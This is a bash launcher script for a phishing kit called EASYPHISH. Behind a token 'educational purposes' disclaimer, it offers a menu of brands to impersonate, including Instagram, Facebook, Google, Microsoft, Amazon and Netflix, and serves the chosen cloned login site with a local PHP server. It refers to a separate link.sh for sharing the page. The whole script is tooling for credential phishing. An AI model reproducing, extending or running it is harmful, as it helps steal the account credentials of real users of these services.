#!/bin/bash
clear
echo -e "\e[101m\e[1;77m:: Disclaimer: Developers assume no liability and are not    ::\e[0m\n"
echo -e "\e[101m\e[1;77m:: responsible for any misuse or damage caused by EASYPHISH.  ::\e[0m\n"
echo -e  "\e[101m\e[1;77m:: Only use for educational purporses!!                      ::\e[0m\n"
printf "\n"
echo -e "\e[32m----------------------------------\e[0m"
echo -e "\e[32m | EEEE  AAAAA  SSSSS Y     Y | \e[0m"
echo -e "\e[32m | E     A   A  S      Y   Y  | \e[0m"
echo -e "\e[32m | EEEE  AAAAA  SSSSS   Y Y   | \e[0m"
echo -e "\e[32m | E     A   A      S   Y     | \e[0m"
echo -e "\e[32m | EEEE  A   A  SSSSS  Y      | \e[0m"
echo -e "\e[32m--------------------------------------\e[0m"
echo -e "\e[32m | PPP   H   H  IIIII  SSSSS  H   H | \e[0m"
echo -e "\e[32m | P  P  H   H    I    S      H   H | \e[0m"
echo -e "\e[32m | PPP   HHHHH    I    SSSSS  HHHHH | \e[0m"
echo -e "\e[32m | P     H   H    I        S  H   H | \e[0m"
echo -e "\e[32m | P     H   H  IIIII  SSSSS  H   H | \e[0m"
echo -e "\e[32m---------------------------------------\e[0m  \n"
echo -e "\e[0;41m            -coded by Afreedi \e[0m "
echo ""
echo -e "\e[36m special thanks to NOOB HACKERS & @suljot_gjoka & @thelinuxchoice\e[0m"
echo ""
echo " "
echo -e "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m INSTAGRAM \e[0m"
echo -e "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m FACEBOOK \e[0m"
echo -e "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m NETFLIX \e[0m"
echo -e "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m YAHOO \e[0m"
echo -e "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;93m WIFI \e[0m"
echo -e "\e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;93m GOOGLE \e[0m"
echo -e "\e[1;92m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[0m\e[1;93m AMAZON \e[0m"
echo -e "\e[1;92m[\e[0m\e[1;77m08\e[0m\e[1;92m]\e[0m\e[1;93m MICROSOFT \e[0m"
echo -e "\e[1;92m[\e[0m\e[1;77m09\e[0m\e[1;92m]\e[0m\e[1;93m TWITTER \e[0m"
echo -e "\e[1;92m[\e[0m\e[1;77m10\e[0m\e[1;92m]\e[0m\e[1;93m SHOPPING \e[0m"
echo -e "\e[1;92m[\e[0m\e[1;77m11\e[0m\e[1;92m]\e[0m\e[1;93m EXIT \e[0m"
echo ""
echo -n -e "\e[36m pls select a platform you want to phish : "
read var
so()
{
echo -n  "enter the port number : "
read no
echo "get the link by executing link.sh in new secssion :-) "
echo ""
php -S localhost:$no
}
if [ $var = "1" ]
then
cd /$HOME/Easyphish/sites/instagram/
so
fi

if [ $var = "2" ]
then
cd /$HOME/Easyphish/sites/facebook/
so
fi

if [ $var = "3" ]
then
cd /$HOME/Easyphish/sites/netflix/
so
fi

if  [ $var = "4" ]
then
cd /$HOME/Easyphish/sites/yahoo/
so
fi

if [ $var = "5" ]
then
cd /$HOME/Easyphish/sites/wifi/
so
fi

if [ $var = "6" ]
then
cd /$HOME/Easyphish/sites/google/
so
fi

if [ $var = "7" ]
then
cd /$HOME/Easyphish/sites/amazon/
so
fi

if [ $var = "8" ]
then
cd /$HOME/Easyphish/sites/microsoft/
so
fi

if [ $var = "9" ]
then
cd /$HOME/Easyphish/sites/twitter/
so
fi

if [ $var = "10" ]
then
cd /$HOME/Easyphish/sites/shopping/
so
fi

if [ $var = "11" ]
then
echo "have a good day :-) by, by,..."
sleep 3.0
exit 3
fi
